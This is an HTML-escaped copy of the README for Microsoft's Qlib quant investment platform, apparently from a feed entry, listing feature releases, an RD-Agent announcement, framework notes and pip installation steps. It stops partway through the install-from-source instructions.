      <description>&lt;p&gt;Qlib is an AI-oriented Quant investment platform that aims to use AI tech to empower Quant Research, from exploring ideas to implementing productions. Qlib supports diverse ML modeling paradigms, including supervised learning, market dynamics modeling, and RL, and is now equipped with https://github.com/microsoft/RD-Agent to automate R&amp;D process.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href="https://pypi.org/project/pyqlib/#files"&gt;&lt;img src="https://img.shields.io/pypi/pyversions/pyqlib.svg?logo=python&amp;amp;logoColor=white" alt="Python Versions" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/pyqlib/#files"&gt;&lt;img src="https://img.shields.io/badge/platform-linux%20%7C%20windows%20%7C%20macos-lightgrey" alt="Platform" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/pyqlib/#history"&gt;&lt;img src="https://img.shields.io/pypi/v/pyqlib" alt="PypI Versions" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/pyqlib/"&gt;&lt;img src="https://github.com/microsoft/qlib/workflows/Upload%20Python%20Package/badge.svg?sanitize=true" alt="Upload Python Package" /&gt;&lt;/a&gt; &lt;a href="https://github.com/microsoft/qlib/actions"&gt;&lt;img src="https://github.com/microsoft/qlib/workflows/Test/badge.svg?branch=main" alt="Github Actions Test Status" /&gt;&lt;/a&gt; &lt;a href="https://qlib.readthedocs.io/en/latest/?badge=latest"&gt;&lt;img src="https://readthedocs.org/projects/qlib/badge/?version=latest" alt="Documentation Status" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/LICENSE"&gt;&lt;img src="https://img.shields.io/pypi/l/pyqlib" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://gitter.im/Microsoft/qlib?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge"&gt;&lt;img src="https://badges.gitter.im/Microsoft/qlib.svg?sanitize=true" alt="Join the chat at https://gitter.im/Microsoft/qlib" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;&lt;span&gt;üì∞&lt;/span&gt; &lt;strong&gt;What's NEW!&lt;/strong&gt; &amp;nbsp; &lt;span&gt;üíñ&lt;/span&gt;&lt;/h2&gt; 
&lt;p&gt;Recent released features&lt;/p&gt; 
&lt;h3&gt;Introducing &lt;a href="https://github.com/microsoft/RD-Agent"&gt;&lt;img src="https://raw.githubusercontent.com/microsoft/qlib/main/docs/_static/img/rdagent_logo.png" alt="RD_Agent" style="height: 2em" /&gt;&lt;/a&gt;: LLM-Based Autonomous Evolving Agents for Industrial Data-Driven R&amp;amp;D&lt;/h3&gt; 
&lt;p&gt;We are excited to announce the release of &lt;strong&gt;RD-Agent&lt;/strong&gt;üì¢, a powerful tool that supports automated factor mining and model optimization in quant investment R&amp;amp;D.&lt;/p&gt; 
&lt;p&gt;RD-Agent is now available on &lt;a href="https://github.com/microsoft/RD-Agent"&gt;GitHub&lt;/a&gt;, and we welcome your starüåü!&lt;/p&gt; 
&lt;p&gt;To learn more, please visit our &lt;a href="https://rdagent.azurewebsites.net/"&gt;‚ôæÔ∏èDemo page&lt;/a&gt;. Here, you will find demo videos in both English and Chinese to help you better understand the scenario and usage of RD-Agent.&lt;/p&gt; 
&lt;p&gt;We have prepared several demo videos for you:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Scenario&lt;/th&gt; 
   &lt;th&gt;Demo video (English)&lt;/th&gt; 
   &lt;th&gt;Demo video (‰∏≠Êñá)&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Quant Factor Mining&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://rdagent.azurewebsites.net/factor_loop?lang=en"&gt;Link&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://rdagent.azurewebsites.net/factor_loop?lang=zh"&gt;Link&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Quant Factor Mining from reports&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://rdagent.azurewebsites.net/report_factor?lang=en"&gt;Link&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://rdagent.azurewebsites.net/report_factor?lang=zh"&gt;Link&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Quant Model Optimization&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://rdagent.azurewebsites.net/model_loop?lang=en"&gt;Link&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://rdagent.azurewebsites.net/model_loop?lang=zh"&gt;Link&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;ul&gt; 
 &lt;li&gt;üìÉ&lt;strong&gt;Paper&lt;/strong&gt;: &lt;a href="https://arxiv.org/abs/2505.15155"&gt;R&amp;amp;D-Agent-Quant: A Multi-Agent Framework for Data-Centric Factors and Model Joint Optimization&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üëæ&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href="https://github.com/microsoft/RD-Agent/"&gt;https://github.com/microsoft/RD-Agent/&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class="language-BibTeX"&gt;@misc{li2025rdagentquant,
    title={R\&amp;amp;D-Agent-Quant: A Multi-Agent Framework for Data-Centric Factors and Model Joint Optimization},
    author={Yuante Li and Xu Yang and Xiao Yang and Minrui Xu and Xisen Wang and Weiqing Liu and Jiang Bian},
    year={2025},
    eprint={2505.15155},
    archivePrefix={arXiv},
    primaryClass={cs.AI}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;img src="https://github.com/user-attachments/assets/3198bc10-47ba-4ee0-8a8e-46d5ce44f45d" alt="image" /&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Feature&lt;/th&gt; 
   &lt;th&gt;Status&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://arxiv.org/abs/2505.15155"&gt;R&amp;amp;D-Agent-Quant&lt;/a&gt; Published&lt;/td&gt; 
   &lt;td&gt;Apply R&amp;amp;D-Agent to Qlib for quant trading&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;BPQP for End-to-end learning&lt;/td&gt; 
   &lt;td&gt;üìàComing soon!(&lt;a href="https://github.com/microsoft/qlib/pull/1863"&gt;Under review&lt;/a&gt;)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üî•LLM-driven Auto Quant Factoryüî•&lt;/td&gt; 
   &lt;td&gt;üöÄ Released in &lt;a href="https://github.com/microsoft/RD-Agent"&gt;‚ôæÔ∏èRD-Agent&lt;/a&gt; on Aug 8, 2024&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;KRNN and Sandwich models&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/1414/"&gt;Released&lt;/a&gt; on May 26, 2023&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Release Qlib v0.9.0&lt;/td&gt; 
   &lt;td&gt;&lt;img alt="octocat" src="https://github.githubassets.com/images/icons/emoji/octocat.png?v8" /&gt;) &lt;a href="https://github.com/microsoft/qlib/releases/tag/v0.9.0"&gt;Released&lt;/a&gt; on Dec 9, 2022&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;RL Learning Framework&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üî®&lt;/span&gt; &lt;span&gt;üìà&lt;/span&gt; Released on Nov 10, 2022. &lt;a href="https://github.com/microsoft/qlib/pull/1332"&gt;#1332&lt;/a&gt;, &lt;a href="https://github.com/microsoft/qlib/pull/1322"&gt;#1322&lt;/a&gt;, &lt;a href="https://github.com/microsoft/qlib/pull/1316"&gt;#1316&lt;/a&gt;,&lt;a href="https://github.com/microsoft/qlib/pull/1299"&gt;#1299&lt;/a&gt;,&lt;a href="https://github.com/microsoft/qlib/pull/1263"&gt;#1263&lt;/a&gt;, &lt;a href="https://github.com/microsoft/qlib/pull/1244"&gt;#1244&lt;/a&gt;, &lt;a href="https://github.com/microsoft/qlib/pull/1169"&gt;#1169&lt;/a&gt;, &lt;a href="https://github.com/microsoft/qlib/pull/1125"&gt;#1125&lt;/a&gt;, &lt;a href="https://github.com/microsoft/qlib/pull/1076"&gt;#1076&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;HIST and IGMTF models&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/1040"&gt;Released&lt;/a&gt; on Apr 10, 2022&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qlib &lt;a href="https://github.com/microsoft/qlib/tree/main/examples/tutorial"&gt;notebook tutorial&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;üìñ &lt;a href="https://github.com/microsoft/qlib/pull/1037"&gt;Released&lt;/a&gt; on Apr 7, 2022&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Ibovespa index data&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üçö&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/990"&gt;Released&lt;/a&gt; on Apr 6, 2022&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Point-in-Time database&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üî®&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/343"&gt;Released&lt;/a&gt; on Mar 10, 2022&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Arctic Provider Backend &amp;amp; Orderbook data example&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üî®&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/744"&gt;Released&lt;/a&gt; on Jan 17, 2022&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Meta-Learning-based framework &amp;amp; DDG-DA&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;span&gt;üî®&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/743"&gt;Released&lt;/a&gt; on Jan 10, 2022&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Planning-based portfolio optimization&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üî®&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/754"&gt;Released&lt;/a&gt; on Dec 28, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Release Qlib v0.8.0&lt;/td&gt; 
   &lt;td&gt;&lt;img alt="octocat" src="https://github.githubassets.com/images/icons/emoji/octocat.png?v8" /&gt;) &lt;a href="https://github.com/microsoft/qlib/releases/tag/v0.8.0"&gt;Released&lt;/a&gt; on Dec 8, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ADD model&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/704"&gt;Released&lt;/a&gt; on Nov 22, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ADARNN model&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/689"&gt;Released&lt;/a&gt; on Nov 14, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;TCN model&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/668"&gt;Released&lt;/a&gt; on Nov 4, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Nested Decision Framework&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üî®&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/438"&gt;Released&lt;/a&gt; on Oct 1, 2021. &lt;a href="https://github.com/microsoft/qlib/raw/main/examples/nested_decision_execution/workflow.py"&gt;Example&lt;/a&gt; and &lt;a href="https://qlib.readthedocs.io/en/latest/component/highfreq.html"&gt;Doc&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Temporal Routing Adaptor (TRA)&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/531"&gt;Released&lt;/a&gt; on July 30, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Transformer &amp;amp; Localformer&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/508"&gt;Released&lt;/a&gt; on July 22, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Release Qlib v0.7.0&lt;/td&gt; 
   &lt;td&gt;&lt;img alt="octocat" src="https://github.githubassets.com/images/icons/emoji/octocat.png?v8" /&gt;) &lt;a href="https://github.com/microsoft/qlib/releases/tag/v0.7.0"&gt;Released&lt;/a&gt; on July 12, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;TCTS Model&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/491"&gt;Released&lt;/a&gt; on July 1, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Online serving and automatic model rolling&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üî®&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/290"&gt;Released&lt;/a&gt; on May 17, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;DoubleEnsemble Model&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/286"&gt;Released&lt;/a&gt; on Mar 2, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;High-frequency data processing example&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üî®&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/257"&gt;Released&lt;/a&gt; on Feb 5, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;High-frequency trading example&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/227"&gt;Part of code released&lt;/a&gt; on Jan 28, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;High-frequency data(1min)&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üçö&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/221"&gt;Released&lt;/a&gt; on Jan 27, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Tabnet Model&lt;/td&gt; 
   &lt;td&gt;&lt;span&gt;üìà&lt;/span&gt; &lt;a href="https://github.com/microsoft/qlib/pull/205"&gt;Released&lt;/a&gt; on Jan 22, 2021&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;Features released before 2021 are not listed here.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/qlib/main/docs/_static/img/logo/1.png" /&gt; &lt;/p&gt; 
&lt;p&gt;Qlib is an open-source, AI-oriented quantitative investment platform that aims to realize the potential, empower research, and create value using AI technologies in quantitative investment, from exploring ideas to implementing productions. Qlib supports diverse machine learning modeling paradigms, including supervised learning, market dynamics modeling, and reinforcement learning.&lt;/p&gt; 
&lt;p&gt;An increasing number of SOTA Quant research works/papers in diverse paradigms are being released in Qlib to collaboratively solve key challenges in quantitative investment. For example, 1) using supervised learning to mine the market's complex non-linear patterns from rich and heterogeneous financial data, 2) modeling the dynamic nature of the financial market using adaptive concept drift technology, and 3) using reinforcement learning to model continuous investment decisions and assist investors in optimizing their trading strategies.&lt;/p&gt; 
&lt;p&gt;It contains the full ML pipeline of data processing, model training, back-testing; and covers the entire chain of quantitative investment: alpha seeking, risk modeling, portfolio optimization, and order execution. For more details, please refer to our paper &lt;a href="https://arxiv.org/abs/2009.11189"&gt;"Qlib: An AI-oriented Quantitative Investment Platform"&lt;/a&gt;.&lt;/p&gt; 
&lt;table&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Frameworks, Tutorial, Data &amp;amp; DevOps&lt;/th&gt; 
   &lt;th&gt;Main Challenges &amp;amp; Solutions in Quant Research&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#plans"&gt;&lt;strong&gt;Plans&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#framework-of-qlib"&gt;Framework of Qlib&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#quick-start"&gt;Quick Start&lt;/a&gt;&lt;/li&gt; 
    &lt;ul dir="auto"&gt; 
     &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#installation"&gt;Installation&lt;/a&gt; &lt;/li&gt; 
     &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#data-preparation"&gt;Data Preparation&lt;/a&gt;&lt;/li&gt; 
     &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#auto-quant-research-workflow"&gt;Auto Quant Research Workflow&lt;/a&gt;&lt;/li&gt; 
     &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#building-customized-quant-research-workflow-by-code"&gt;Building Customized Quant Research Workflow by Code&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#quant-dataset-zoo"&gt;&lt;strong&gt;Quant Dataset Zoo&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#learning-framework"&gt;Learning Framework&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#more-about-qlib"&gt;More About Qlib&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#offline-mode-and-online-mode"&gt;Offline Mode and Online Mode&lt;/a&gt; 
     &lt;ul&gt; 
      &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#performance-of-qlib-data-server"&gt;Performance of Qlib Data Server&lt;/a&gt;&lt;/li&gt;
     &lt;/ul&gt; &lt;/li&gt;&lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#related-reports"&gt;Related Reports&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#contact-us"&gt;Contact Us&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#contributing"&gt;Contributing&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; 
   &lt;td valign="baseline"&gt; &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#main-challenges--solutions-in-quant-research"&gt;Main Challenges &amp;amp; Solutions in Quant Research&lt;/a&gt; 
     &lt;ul&gt; 
      &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#forecasting-finding-valuable-signalspatterns"&gt;Forecasting: Finding Valuable Signals/Patterns&lt;/a&gt; 
       &lt;ul&gt; 
        &lt;li type="disc"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#quant-model-paper-zoo"&gt;&lt;strong&gt;Quant Model (Paper) Zoo&lt;/strong&gt;&lt;/a&gt; 
         &lt;ul&gt; 
          &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#run-a-single-model"&gt;Run a Single Model&lt;/a&gt;&lt;/li&gt; 
          &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#run-multiple-models"&gt;Run Multiple Models&lt;/a&gt;&lt;/li&gt; 
         &lt;/ul&gt; &lt;/li&gt; 
       &lt;/ul&gt; &lt;/li&gt; 
      &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#adapting-to-market-dynamics"&gt;Adapting to Market Dynamics&lt;/a&gt;&lt;/li&gt; 
      &lt;li type="circle"&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#reinforcement-learning-modeling-continuous-decisions"&gt;Reinforcement Learning: modeling continuous decisions&lt;/a&gt;&lt;/li&gt; 
     &lt;/ul&gt; &lt;/li&gt; &lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h1&gt;Plans&lt;/h1&gt; 
&lt;p&gt;New features under development(order by estimated release time). Your feedbacks about the features are very important.&lt;/p&gt; 
&lt;!-- | Feature                        | Status      | --&gt; 
&lt;!-- | --                      | ------    | --&gt; 
&lt;h1&gt;Framework of Qlib&lt;/h1&gt; 
&lt;div style="align: center"&gt; 
 &lt;img src="https://raw.githubusercontent.com/microsoft/qlib/main/docs/_static/img/framework-abstract.jpg" /&gt; 
&lt;/div&gt; 
&lt;p&gt;The high-level framework of Qlib can be found above(users can find the &lt;a href="https://qlib.readthedocs.io/en/latest/introduction/introduction.html#framework"&gt;detailed framework&lt;/a&gt; of Qlib's design when getting into nitty gritty). The components are designed as loose-coupled modules, and each component could be used stand-alone.&lt;/p&gt; 
&lt;p&gt;Qlib provides a strong infrastructure to support Quant research. &lt;a href="https://qlib.readthedocs.io/en/latest/component/data.html"&gt;Data&lt;/a&gt; is always an important part. A strong learning framework is designed to support diverse learning paradigms (e.g. &lt;a href="https://qlib.readthedocs.io/en/latest/component/rl.html"&gt;reinforcement learning&lt;/a&gt;, &lt;a href="https://qlib.readthedocs.io/en/latest/component/workflow.html#model-section"&gt;supervised learning&lt;/a&gt;) and patterns at different levels(e.g. &lt;a href="https://qlib.readthedocs.io/en/latest/component/meta.html"&gt;market dynamic modeling&lt;/a&gt;). By modeling the market, &lt;a href="https://qlib.readthedocs.io/en/latest/component/strategy.html"&gt;trading strategies&lt;/a&gt; will generate trade decisions that will be executed. Multiple trading strategies and executors in different levels or granularities can be &lt;a href="https://qlib.readthedocs.io/en/latest/component/highfreq.html"&gt;nested to be optimized and run together&lt;/a&gt;. At last, a comprehensive &lt;a href="https://qlib.readthedocs.io/en/latest/component/report.html"&gt;analysis&lt;/a&gt; will be provided and the model can be &lt;a href="https://qlib.readthedocs.io/en/latest/component/online.html"&gt;served online&lt;/a&gt; in a low cost.&lt;/p&gt; 
&lt;h1&gt;Quick Start&lt;/h1&gt; 
&lt;p&gt;This quick start guide tries to demonstrate&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;It's very easy to build a complete Quant research workflow and try your ideas with &lt;em&gt;Qlib&lt;/em&gt;.&lt;/li&gt; 
 &lt;li&gt;Though with &lt;em&gt;public data&lt;/em&gt; and &lt;em&gt;simple models&lt;/em&gt;, machine learning technologies &lt;strong&gt;work very well&lt;/strong&gt; in practical Quant investment.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Here is a quick &lt;strong&gt;&lt;a href="https://terminalizer.com/view/3f24561a4470"&gt;demo&lt;/a&gt;&lt;/strong&gt; shows how to install &lt;code&gt;Qlib&lt;/code&gt;, and run LightGBM with &lt;code&gt;qrun&lt;/code&gt;. &lt;strong&gt;But&lt;/strong&gt;, please make sure you have already prepared the data following the &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/#data-preparation"&gt;instruction&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;This table demonstrates the supported Python version of &lt;code&gt;Qlib&lt;/code&gt;:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;install with pip&lt;/th&gt; 
   &lt;th align="center"&gt;install from source&lt;/th&gt; 
   &lt;th align="center"&gt;plot&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Python 3.8&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Python 3.9&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Python 3.10&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Python 3.11&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Python 3.12&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;span&gt;‚úî&lt;/span&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Conda&lt;/strong&gt; is suggested for managing your Python environment. In some cases, using Python outside of a &lt;code&gt;conda&lt;/code&gt; environment may result in missing header files, causing the installation failure of certain packages.&lt;/li&gt; 
 &lt;li&gt;Please pay attention that installing cython in Python 3.6 will raise some error when installing &lt;code&gt;Qlib&lt;/code&gt; from source. If users use Python 3.6 on their machines, it is recommended to &lt;em&gt;upgrade&lt;/em&gt; Python to version 3.8 or higher, or use &lt;code&gt;conda&lt;/code&gt;'s Python to install &lt;code&gt;Qlib&lt;/code&gt; from source.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Install with pip&lt;/h3&gt; 
&lt;p&gt;Users can easily install &lt;code&gt;Qlib&lt;/code&gt; by pip according to the following command.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;  pip install pyqlib
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: pip will install the latest stable qlib. However, the main branch of qlib is in active development. If you want to test the latest scripts or functions in the main branch. Please install qlib with the methods below.&lt;/p&gt; 
&lt;h3&gt;Install from source&lt;/h3&gt; 
&lt;p&gt;Also, users can install the latest dev version &lt;code&gt;Qlib&lt;/code&gt; by the source code according to the following steps:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Before installing &lt;code&gt;Qlib&lt;/code&gt; from source, users need to install some dependencies:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;pip install numpy
pip install --upgrade cython
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
